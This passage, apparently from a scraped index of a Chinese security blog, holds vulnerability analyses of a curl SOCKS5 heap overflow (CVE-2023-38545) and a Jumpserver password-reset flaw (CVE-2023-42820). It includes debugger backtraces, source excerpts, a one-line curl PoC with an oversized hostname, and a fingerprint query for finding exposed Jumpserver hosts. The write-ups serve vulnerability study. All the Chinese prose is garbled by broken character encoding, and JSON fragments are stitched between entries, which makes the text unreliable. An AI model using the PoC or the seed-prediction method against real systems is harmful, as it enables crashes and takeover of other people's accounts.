curl_easy_perform (data=0x5555555e6ef8) at easy.c:791 #11 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479 #12 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670 #13 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786 #14 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274 gefâ¤ åœ¨è¿™çŠ¶æ€ä¸‹ï¼Œcurlä¼šåˆå§‹åŒ–ä¸€äº›SOCKSè¯·æ±‚bodyå¹¶å°†å…¶å‘é€ç»™socks serverï¼Œè€Œåå°†çŠ¶æ€è½¬ä¸º CONNECT_SOCKS_READ_INITå¹¶è·³è½¬åˆ°å¯¹åº”ä»£ç å¤„ã€‚\nidx = 0; socksreq[idx++] = 5; /* version */ idx++; /* number of authentication methods */ socksreq[idx++] = 0; /* no authentication */ if(allow_gssapi) socksreq[idx++] = 1; /* GSS-API */ if(sx-\u0026gt;proxy_user) socksreq[idx++] = 2; /* username/password */ /* write the number of authentication methods */ socksreq[1] = (unsigned char) (idx - 2); sx-\u0026gt;outp = socksreq; sx-\u0026gt;outstanding = idx; presult = socks_state_send(cf, sx, data, CURLPX_SEND_CONNECT, ...... sxstate(sx, data, CONNECT_SOCKS_READ); goto CONNECT_SOCKS_READ_INIT; åœ¨çŠ¶æ€ CONNECT_SOCKS_READ_INITä¸­ï¼Œä¼šèµ‹å€¼ç»“æ„ä½“æˆå‘˜è€Œåå°†çŠ¶æ€è½¬ä¸º CONNECT_SOCKS_READï¼Œcurlä¼šå°è¯•ä»TCPè¿æ¥ä¸­è¯»å–æ•°æ®\ncase CONNECT_SOCKS_READ_INIT: sx-\u0026gt;outstanding = 2; /* expect two bytes */ sx-\u0026gt;outp = socksreq; /* store it here */ /* FALLTHROUGH */ case CONNECT_SOCKS_READ: presult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT, \u0026#34;initial SOCKS5 response\u0026#34;); if(CURLPX_OK != presult) return presult; else if(sx-\u0026gt;outstanding) { /* remain in reading state */ return CURLPX_OK; } è¯»å–æ•°æ®æ—¶ï¼Œå…¶è°ƒç”¨æ ˆå¦‚ä¸‹\ngefâ¤ bt #0 cf_socket_recv (cf=0x5555555e6a28, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cf-socket.c:1352 #1 0x00007ffff7ed5d95 in Curl_cf_def_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:100 #2 0x00007ffff7ed6762 in Curl_conn_cf_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:328 #3 0x00007ffff7f4839a in socks_state_recv (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8, failcode=CURLPX_RECV_CONNECT, description=0x7ffff7f82254 \u0026#34;initial SOCKS5 response\u0026#34;) at socks.c:241 #4 0x00007ffff7f49274 in do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:646 #5 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067 #6 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149 #7 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296 #8 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201 #9 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351 #10 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106 #11 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742 #12 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682 #13 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772 #14 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791 #15 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479 #16 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670 #17 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786 #18 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274 è®©æˆ‘ä»¬æŠŠä»£ç æ”¾åœ¨ä¸€èµ·çœ‹ï¼Œåœ¨do_SOCKS5å‡½æ•°ä¸­ï¼Œå°† sx-\u0026gt;outstandingèµ‹å€¼ä¸º2ï¼Œå°è¯•è°ƒç”¨ socks_state_recvä»TCP sockä¸­è¯»å–ä¸¤ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç»è¿‡å±‚å±‚è°ƒç”¨æœ€ç»ˆè¿›å…¥åˆ° nw_in_readå‡½æ•°ä¸­ï¼Œè°ƒç”¨recvå‡½æ•°ä»sockä¸­è¯»å–æ•°æ®ã€‚\npresult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT, \u0026#34;initial SOCKS5 response\u0026#34;); if(CURLPX_OK != presult) return presult; else if(sx-\u0026gt;outstanding) { /* remain in reading state */ return CURLPX_OK; } static CURLproxycode socks_state_recv(struct Curl_cfilter *cf, ..... { ssize_t nread; CURLcode result; nread = Curl_conn_cf_recv(cf-\u0026gt;next, data, (char *)sx-\u0026gt;outp, sx-\u0026gt;outstanding, \u0026amp;result); ...... sx-\u0026gt;outstanding -= nread; return CURLPX_OK; } ssize_t Curl_conn_cf_recv(struct Curl_cfilter *cf, struct Curl_easy *data, { if(cf) return cf-\u0026gt;cft-\u0026gt;do_recv(cf, data, buf, len, err); *err = CURLE_RECV_ERROR; return -1; } static ssize_t cf_socket_recv(struct Curl_cfilter *cf, struct Curl_easy *data, char *buf, size_t len, CURLcode *err) { struct cf_socket_ctx *ctx = cf-\u0026gt;ctx; curl_socket_t fdsave; ssize_t nread; *err = CURLE_OK; fdsave = cf-\u0026gt;conn-\u0026gt;sock[cf-\u0026gt;sockindex]; cf-\u0026gt;conn-\u0026gt;sock[cf-\u0026gt;sockindex] = ctx-\u0026gt;sock; ...... else { nread = nw_in_read(\u0026amp;rctx, (unsigned char *)buf, len, err); ...... return nread; } static ssize_t nw_in_read(void *reader_ctx, unsigned char *buf, size_t len, CURLcode *err) { struct reader_ctx *rctx = reader_ctx; struct cf_socket_ctx *ctx = rctx-\u0026gt;cf-\u0026gt;ctx; ssize_t nread; *err = CURLE_OK; nread = sread(ctx-\u0026gt;sock, buf, len); ...... return nread; } #define sread(x,y,z) (ssize_t)recv((RECV_TYPE_ARG1)(x), \\ (RECV_TYPE_ARG2)(y), \\ (RECV_TYPE_ARG3)(z), \\ (RECV_TYPE_ARG4)(0)) æ ¹æ®RFC1928ï¼ŒæœåŠ¡å™¨ä¼šåœ¨å®¢æˆ·ç«¯å‘é€helloåŒ…ä¹‹åè¿”å›ï¼Œé€‰æ‹©é€šä¿¡æ–¹æ³•åè¿”å›server hello client hello server hello æ­£å¸¸æƒ…å†µä¸‹ï¼ŒsocksæœåŠ¡å™¨è¿”å›server helloä¹‹åï¼Œsocks_state_recvè¯»å–äº†ä¸¤ä¸ªå­—èŠ‚çš„æ•°æ®å¹¶é€šè¿‡ sx-\u0026gt;outstanding -= nread;ä½¿å¾—outstanding=0ï¼Œä¹‹ååœ¨çŠ¶æ€æœºå†…ä¼šç»§ç»­å¤„ç†socksè¿æ¥ã€‚\nä½†å¦‚æœæ”»å‡»è€…å¯æ§socksæœåŠ¡å™¨ï¼Œå¹¶å¼ºè¿«åœ¨æœåŠ¡å™¨åœ¨client å‘é€helloä¹‹åï¼Œè¿‡äº†client è®¾ç½®çš„sock timeoutåœ¨è¿”å›æ•°æ®åŒ…çš„è¯ä¼šæ€ä¹ˆæ ·ï¼Ÿ recvå‡½æ•°å¦‚æœåœ¨setsockoptè®¾ç½®çš„è¶…æ—¶æ—¶é—´å†…è¿˜æ²¡æœ‰ä»TCPè¿æ¥è¯»å–åˆ°æ•°æ®çš„è¯ï¼Œåˆ™ä¼šè¿”å›-1ï¼Œå¹¶ä¸”errè¢«è®¾ç½®ä¸ºCURLE_AGAIN ï¼Œåœ¨ socks_state_recvå‡½æ•°ä¸­å› ä¸ºè¯»å–åˆ°çš„nread=-1ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°è¿”å›CURLPX_OKã€‚\nè¿”å›åˆ°çŠ¶æ€æœºä¸­ï¼Œpresult=CURLPX_OKï¼Œsx-\u0026gt;outstanding=2ï¼Œdo_SOCKS5å‡½æ•°è¿”å›CURLPX_OKï¼Œå› ä¸ºæ²¡è¯»æ•°æ®ï¼Œæ‰€ä»¥åœ¨easy.cä¸­ä¼šç»§ç»­å¾ªç¯ã€‚\nstatic CURLcode easy_transfer(struct Curl_multi *multi) { bool done = FALSE; CURLMcode mcode = CURLM_OK; CURLcode result = CURLE_OK; while(!done \u0026amp;\u0026amp; !mcode) { int still_running = 0; mcode = curl_multi_poll(multi, NULL, 0, 1000, NULL); if(!mcode) mcode = curl_multi_perform(multi, \u0026amp;still_running); /* only read \u0026#39;still_running\u0026#39; if curl_multi_perform() return OK */ if(!mcode \u0026amp;\u0026amp; !still_running) { int rc; CURLMsg *msg = curl_multi_info_read(multi, \u0026amp;rc); if(msg) { result = msg-\u0026gt;data.result; done = TRUE; } } } /* Make sure to return some kind of error if there was a multi problem */ if(mcode) { result = (mcode == CURLM_OUT_OF_MEMORY) ? CURLE_OUT_OF_MEMORY : /* The other multi errors should never happen, so return something suitably generic */ CURLE_BAD_FUNCTION_ARGUMENT; } return result; } æ­¤æ—¶socksæœåŠ¡å™¨è¿”å›æ•°æ®çš„è¯ï¼Œå†æ¬¡è¿›å…¥åˆ°do_SOCKS5å‡½æ•°ï¼Œæ­¤æ—¶åœ¨å‡½æ•°å¼€å¤´socks5_resolve_local=falseï¼Œè¿›å…¥åˆ°çŠ¶æ€æœºä¸­ï¼Œç”±äºæ­¤æ—¶çŠ¶æ€ä¸å†æ˜¯CONNECT_SOCKS_INITï¼Œæ‰€ä»¥socks5_resolve_localä¸ä¼šè¢«è®¾ç½®ä¸ºtrueï¼Œæ­¤æ—¶åœ¨çŠ¶æ€CONNECT_REQ_INITæ—¶ï¼ŒçŠ¶æ€æœºä¼šè·³è½¬åˆ°çŠ¶æ€CONNECT_RESOLVE_REMOTEï¼Œä¹Ÿå°±æ˜¯curlå°è¯•è®©socksæœåŠ¡å™¨è¿›è¡ŒDNSè§£æå¹¶è¯·æ±‚ã€‚\nunsigned char *socksreq = (unsigned char *)data-\u0026gt;state.buffer; const size_t hostname_len = strlen(sx-\u0026gt;hostname); CONNECT_RESOLVE_REMOTE: case CONNECT_RESOLVE_REMOTE: /* Authentication is complete, now specify destination to the proxy */ len = 0; socksreq[len++] = 5; /* version (SOCKS5) */ socksreq[len++] = 1; /* connect */ socksreq[len++] = 0; /* must be zero */ if(!socks5_resolve_local) { ...... memcpy(\u0026amp;socksreq[len], sx-\u0026gt;hostname, hostname_len); /* w/o NULL */ ...... } /* FALLTHROUGH */ æ­¤æ—¶curlä¼šå°è¯•å°†ä¸»æœºåé€šè¿‡memcpyæ‹·è´åˆ°tcp è¯·æ±‚ä½“ä¸­ï¼Œè€ŒsocksreqæŒ‡å‘çš„å†…å­˜ç”±Curl_preconnectåˆ†é…\nCURLcode Curl_preconnect(struct Curl_easy *data) { if(!data-\u0026gt;state.buffer) { data-\u0026gt;state.buffer = malloc(data-\u0026gt;set.buffer_size + 1); if(!data-\u0026gt;state.buffer) return CURLE_OUT_OF_MEMORY; } return CURLE_OK; } åœ¨æˆ‘çš„ç¯å¢ƒä¸­å¯ä»¥çœ‹åˆ°æœ€ç»ˆçš„å†…å­˜å¤§å°ä¸º0x8ce+1\ngefâ¤ p data.set.buffer_size $12 = 0x8ce gefâ¤ æ‰€ä»¥å¦‚æœæ„é€ å¤§äºè¿™ä¸ªå¤§å°çš„hostnameï¼Œåœ¨memcpyæ—¶å°±å¯ä»¥è§¦å‘å †æº¢å‡ºã€‚\nPoC\ncurl --location --limit-rate 2254B --socks5-hostname 192.168.32.1:10808 $(python3 -c \u0026#34;print(\u0026#39;A\u0026#39;*10000,end=\u0026#39;\u0026#39;)\u0026#34;) å°ç»“ åœ¨ä¿®å¤ä»£ç ä¸­ï¼Œå¦‚æœhostnameè¶…è¿‡255åˆ™ä¼šç›´æ¥è¿”å›é”™è¯¯ï¼Œè€Œä¸å†è®¿é—®åé¢çš„çŠ¶æ€æœºï¼Œç›´æ¥é˜»æ–­äº†è°ƒç”¨é“¾ã€‚è™½ç„¶urlçš„hostnameæ²¡æœ‰é•¿åº¦è§„å®šï¼Œå¯ä»¥è¶…è¿‡1024ï¼Œä½†ç”±äºDNSè§£ææœ€å¤§åªæ”¯æŒ255å­—èŠ‚çš„åŸŸåï¼Œæ‰€ä»¥åœ¨æ­£å¸¸è¯·æ±‚ä¸­ä¸åº”è¯¥å‡ºç°åŸŸåå¤§äº255çš„æƒ…å†µï¼Œä»è¿™ä¸ªè§’åº¦çœ‹æ­¤æ¬¡ä¿®å¤æ–¹å¼ä¹Ÿå¾ˆåˆç†ã€‚\nä»åˆ©ç”¨è§’åº¦çœ‹è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦å¯ä»¥æ§åˆ¶curlæˆ–libcurlä½¿ç”¨çš„socks5ä»£ç†ï¼Œè¿˜éœ€è¦æ§åˆ¶ä¼ é€’ç»™curlå’Œlibcurlçš„urlï¼Œè€Œåæ‰èƒ½è§¦å‘æ¼æ´ï¼Œè¡¨é¢çœ‹æ”»å‡»è€…å¯ä»¥æ§åˆ¶æº¢å‡ºçš„èŒƒå›´å’Œå†…å®¹ï¼Œå¾ˆå¯èƒ½é€šè¿‡å †æº¢å‡ºé€ æˆä»£ç æ‰§è¡Œã€‚ä½†curlä¼šé€šè¿‡url parserå»éªŒè¯urlæœ‰æ•ˆæ€§ï¼Œå¦‚æœurlæ— æ•ˆåˆ™ä¼šäº§ç”Ÿé”™è¯¯ï¼Œå› æ­¤åªå½“urlåˆæ³•æ—¶æ‰ä¼šè§¦å‘æ¼æ´ï¼Œä¹Ÿå°±æ˜¯æ”»å‡»è€…æ„é€ çš„urlåªèƒ½æ˜¯ASCIIå­—ç¬¦çš„å­é›†ï¼Œç»¼åˆä¸Šé¢çš„æ¡ä»¶ï¼Œè¿™ä¸ªæ¼æ´åˆ©ç”¨éš¾åº¦æå¤§ï¼Œé€ æˆä»£ç æ‰§è¡Œçš„å‡ ç‡å¾ˆå°ã€‚\nè€ƒè™‘åˆ°å¤§éƒ¨åˆ†è½¯ä»¶å³ä½¿èƒ½æ§åˆ¶urlï¼Œä½†ä¹Ÿä¸èƒ½æ§åˆ¶è®©libcurlä½¿ç”¨socks5ä»£ç†ï¼Œæ‰€ä»¥å¯ä»¥æ‹©æœŸä¿®å¤è¿™ä¸ªæ¼æ´ã€‚\né¢˜å¤–è¯ è¿™ä¸ªæ¼æ´è¿˜è®©curlçš„ä½œè€…éš¾è¿‡äº†ä¸€ä¸‹ï¼šIt burns in my soul. ä½œè€…è¯´ï¼Œå¦‚æœä½¿ç”¨å†…å­˜å®‰å…¨çš„è¯­è¨€é‡å†™curlçš„è¯ï¼Œé‚£è¿™äº›æ¼æ´å°±ä¸ä¼šå­˜åœ¨ï¼Œå½“ç„¶åœ¨å¯é¢„è§çš„æœªæ¥curlè¿˜æ˜¯ä¼šç”¨cå¼€å‘ï¼Œä½†ç›®å‰å¯è¡Œçš„åŠæ³•æ˜¯é€æ¸ä½¿ç”¨å†…å­˜å®‰å…¨çš„ä¾èµ–é¡¹æ›¿ä»£ã€‚\nå‚è€ƒé“¾æ¥\nhttps://curl.se/docs/CVE-2023-38545.html\nhttps://daniel.haxx.se/blog/2023/10/11/how-i-made-a-heap-overflow-in-curl/\nhttps://hackerone.com/reports/2187833\nhttps://datatracker.ietf.org/doc/html/rfc1928\nCreated at 2023-10-11T20:40:32+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/","title":"CVE-2023-4863 Libwebp Rce åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"Created at 2023-10-07T10:23:56+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/","title":"CVE-2023-42820 Jumpserver ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ jumpserverä¸­ç¬¬ä¸‰æ–¹åº“å‘ç”¨æˆ·å…¬å¼€äº†éšæœºåº“æ‰€ç”¨çš„seedï¼Œå¹¶ä¸”æ²¡æœ‰é™åˆ¶é‡ç½®å¯†ç æ¥å£çš„æ¬¡æ•°ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è·å–åˆ°éšæœºåº“çš„éšæœºç§å­å¹¶å°è¯•é¢„æµ‹é‡ç½®å¯†ç çš„éªŒè¯ç ï¼Œè¿›è€Œé‡ç½®ä»»æ„ç”¨æˆ·å¯†ç ã€‚ åˆ©ç”¨è¯¥æ¼æ´éœ€è¦å·²çŸ¥ç”¨æˆ·åå’Œå¯¹åº”çš„é‚®ç®±ã€‚\næŒ‡çº¹ hunter\nweb.title=\u0026#34;jumpserver\u0026#34; å½±å“ç‰ˆæœ¬ CVE-2023-42820 v2.24 - v3.6.4 ç¯å¢ƒæ­å»º å‚è€ƒ\rhttps://github.com/jumpserver/Dockerfileï¼Œå°†ç‰ˆæœ¬æ”¹ä¸º3.6.4ï¼Œä½¿ç”¨dockerå¯åŠ¨å³å¯ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸åˆ†æ æ¼æ´åœ¨commit 0eba6d2175ab752399c5aee2dbaaf311bf0a398dä¿®å¤ï¼ŒæŸ¥çœ‹è¡¥ä¸ï¼Œå¯çŸ¥åœ¨apps/common/utils/random.py#random_stringå¤„å¢åŠ äº† random.seed()è°ƒç”¨ï¼ŒåŒæ—¶å¯¹ apps/users/models/user.py#generate_reset_tokenç”Ÿæˆtokenæ”¹ä¸ºå¢åŠ äº† random.seedè°ƒç”¨çš„random_stringå‡½æ•° åˆ°è¿™é‡Œåªèƒ½éšçº¦çŒœåˆ°æ˜¯ä¸€ä¸ªå¯†ç å­¦æœ‰å…³çš„æ¼æ´ï¼Œåº”è¯¥å¯ä»¥é€šè¿‡çˆ†ç ´åˆ©ç”¨ã€‚\næŠ€æœ¯åˆ†æ åœ¨å‰ä¸¤å¤©æœ‰å¸ˆå‚…å†™å‡ºäº†åˆ†æï¼Œæ‰æç„¶å¤§æ‚Ÿã€‚\næ ¹æ®\rjumpserveræœ€æ–°re-authå¤ç°ï¼ˆä¼ªéšæœºç»å…¸æ¡ˆä¾‹ï¼‰å¯çŸ¥åœ¨æœ¬ä¾‹çš„jumpserverä¸­åœ¨å¦‚ä¸‹åœ°æ–¹ç”Ÿæˆé‡ç½®å¯†ç æ—¶çš„éªŒè¯ç ï¼Œå…¶ä¸­ä½¿ç”¨äº†æœ¬æ¬¡ä¿®å¤çš„å‡½æ•° random_stringç”Ÿæˆ6ä½ï¼ŒèŒƒå›´ä¸º000000-999999çš„æ•°å­—éªŒè¯ç \nopt/jumpserver/apps/authentication/api/password.py def create(self, request, *args, **kwargs): token = request.GET.get(\u0026#39;token\u0026#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(\u0026#39;authentication:forgot-previewing\u0026#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(\u0026#39;username\u0026#39;) form_type = serializer.validated_data[\u0026#39;form_type\u0026#39;] code = random_string(6, lower=False, upper=False) with open(\u0026#34;/tmp/code\u0026#34;,\u0026#34;a\u0026#34;) as f: f.write(code+\u0026#34;\\n\u0026#34;) other_args = {} target = serializer.validated_data[form_type] if form_type == \u0026#39;sms\u0026#39;: query_key = \u0026#39;phone\u0026#39; target = target.lstrip(\u0026#39;+\u0026#39;) else: query_key = form_type user, err = self.is_valid_user(username=username, **{query_key: target}) if not user: return Response({\u0026#39;error\u0026#39;: err}, status=400) subject = \u0026#39;%s: %s\u0026#39; % (get_login_title(), _(\u0026#39;Forgot password\u0026#39;)) context = { \u0026#39;user\u0026#39;: user, \u0026#39;title\u0026#39;: subject, \u0026#39;code\u0026#39;: code, } message = render_to_string(\u0026#39;authentication/_msg_reset_password_code.html\u0026#39;, context) other_args[\u0026#39;subject\u0026#39;], other_args[\u0026#39;message\u0026#39;] = subject, message SendAndVerifyCodeUtil(target, code, backend=form_type, **other_args).gen_and_send_async() return Response({\u0026#39;data\u0026#39;: \u0026#39;ok\u0026#39;}, status=200) åœ¨å¤§å­¦å­¦ä¹ cè¯­è¨€çš„randå‡½æ•°æ—¶ï¼Œå¦‚æœä¸å¯¹å…¶æ˜¾å¼ä½¿ç”¨srandå‡½æ•°æ’­ç§çš„è¯ï¼Œåˆ™æ¯æ¬¡è¿è¡Œç¨‹åºéšæœºå‡ºæ¥çš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºrandä½¿ç”¨çš„ç§å­åœ¨è®¡ç®—æœºå¯åŠ¨æ—¶å°±ä¸ä¼šå†å˜åŒ–äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨srandå‡½æ•°äº§ç”Ÿç§å­å¹¶è¿›è¡Œæ’­ç§ï¼Œæ¥ä½¿å¾—randå‡½æ•°çš„ç»“æœä¸ä¸€æ ·ã€‚ å®é™…ä¸Šè®¡ç®—æœºä¸­çš„éšæœºæ•°ä¸æ˜¯çœŸæ­£çš„éšæœºæ•°ï¼Œè€Œæ˜¯ä¼ªéšæœºæ•°ï¼Œè®¡ç®—æœºæ ¹æ®ä¼ å…¥çš„ç§å­ç»è¿‡æŸäº›è¿ç®—å¾—å‡ºç»“æœã€‚ å¯¹äºä¸€ä¸ªè¿›ç¨‹ï¼Œéšæœºçš„ç§å­ç¡®å®šåˆ™éšæœºæ•°ä¹Ÿç¡®å®šã€‚ è¿™ä¸ªè§„å¾‹åœ¨pythonä¸­ä¹Ÿä¸€æ ·ï¼Œå¯¹äºåŒæ ·çš„seedåŠåŒæ ·çš„éšæœºæ¬¡æ•°ï¼Œä¸€å®šä¼šç”ŸæˆåŒæ ·çš„æ•°å­—ã€‚\nPython 3.11.4 (tags/v3.11.4:d2340ef, Jun 7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)] on win32 Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; random.seed(1010) \u0026gt;\u0026gt;\u0026gt; random.random() 0.6710054770408643 âœ chestnut python3 Python 3.11.4 (main, Jun 7 2023, 10:13:09) [GCC 12.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; random.seed(1010) \u0026gt;\u0026gt;\u0026gt; random.random() 0.6710054770408643 \u0026gt;\u0026gt;\u0026gt; è™½ç„¶æˆ‘ä»¬ç°åœ¨çŸ¥é“äº†è¿™ä¸ªæ¼æ´åº”è¯¥æºäºä¼ªéšæœºæ•°ï¼Œä½†æˆ‘ä»¬å¦‚æœæ²¡åŠæ³•è·å–åˆ°éšæœºæ—¶æ‰€è®¾ç½®çš„ç§å­ï¼Œä¹Ÿæ²¡åŠæ³•é¢„æµ‹éšå³ç»“æœã€‚\nä¸‹é¢å°±æ˜¯è¿™ä¸ªæ¼æ´çš„ç²¾åæ‰€åœ¨ï¼Œæ ¹æ®æ–‡ç« æ‰€è¿°ã€‚ djangoä½¿ç”¨äº†ç¬¬ä¸‰æ–¹åº“djiango-simple-captchaåº“æ¥ç”ŸæˆéªŒè¯ç ï¼Œåœ¨è¿™ä¸ªåº“ç”Ÿæˆçš„æ—¶å€™ä¼šæœ‰å¦‚ä¸‹é€»è¾‘ï¼š åœ¨usr/local/lib/python3.11/site-packages/captcha/views.py$captcha_imageä¸­ï¼Œé€šè¿‡ä¼ å…¥çš„keyè®¾ç½®random.seed()ï¼Œè€Œä¼ å…¥çš„keyåˆ™æ˜¯æµè§ˆå™¨å‘åç«¯è¯·æ±‚å›¾ç‰‡çš„è·¯å¾„ï¼Œä¸‹å›¾çš„keyä¸º c83d66ac7dca7e2189ad17a9a3e532f2e87d5c07\ndef captcha_image(request, key, scale=1): if scale == 2 and not settings.CAPTCHA_2X_IMAGE: raise Http404 try: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) random.seed(key) # Do not generate different images for the same key text = store.challenge ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å›¾ç‰‡çš„urlé—´æ¥çŸ¥é“jumpserveréšæœºæ—¶æ‰€ä½¿ç”¨çš„ç§å­ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡å›¾ç‰‡åœ°å€æˆ‘ä»¬å¯ä»¥è·å–åˆ°ç§å­ï¼Œå¦‚æœç”ŸæˆéªŒè¯ç æ—¶æ‰€åœ¨çš„è¿›ç¨‹å’Œè¿™ä¸ªç”Ÿæˆå›¾ç‰‡éªŒè¯ç çš„è¿›ç¨‹åœ¨åŒä¸€ä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è·å–åˆ°çš„ç§å­å’Œä½¿ç”¨jumpserverç”ŸæˆéªŒè¯ç çš„ç®—æ³•æ¥é¢„æµ‹jumpserverç”Ÿæˆé‡ç½®å¯†ç çš„éªŒè¯ç ã€‚ è¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨å¾ˆå°‘çš„æ—¶é—´ï¼ˆæ¬¡æ•°ï¼‰å†…é¢„æµ‹åˆ°é‡ç½®å¯†ç çš„éªŒè¯ç ï¼Œè¿›è€Œé‡ç½®å¯†ç ã€‚ ä½†ä»…ä»…è¿™ä¹ˆç®€å•å—ï¼Ÿåœ¨jumpserverä¸­ä½¿ç”¨äº† gunicornï¼Œå®ƒä¼šä½¿ç”¨masterè¿›ç¨‹fork workerè¿›ç¨‹ï¼Œå¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬é€šè¿‡å•æ¬¡çš„å›¾ç‰‡è¯·æ±‚è·å–åˆ°äº†randomçš„ç§å­ï¼Œå¤„ç†é‡ç½®å¯†ç è¯·æ±‚çš„è¿›ç¨‹å¯èƒ½ä¸æ˜¯è¢«è·å–åˆ°ç§å­çš„è¿›ç¨‹ï¼Œè¿™æ ·é¢„æµ‹å‡ºæ¥çš„éªŒè¯ç å’Œé‡ç½®å¯†ç æ—¶ç”Ÿæˆçš„ä¸ä¼šä¸€æ ·ã€‚\nâœ chestnut docker top 808b | grep python root 5704 5674 0 11:08 ? 00:00:02 python jms start web root 5864 5704 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/celery -A ops flower -logging=info --url_prefix=/core/flower --auto_refresh=False --max_tasks=1000 --state_save_interval=600000 root 5865 5704 0 11:08 ? 00:00:00 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5867 5865 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5868 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5873 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 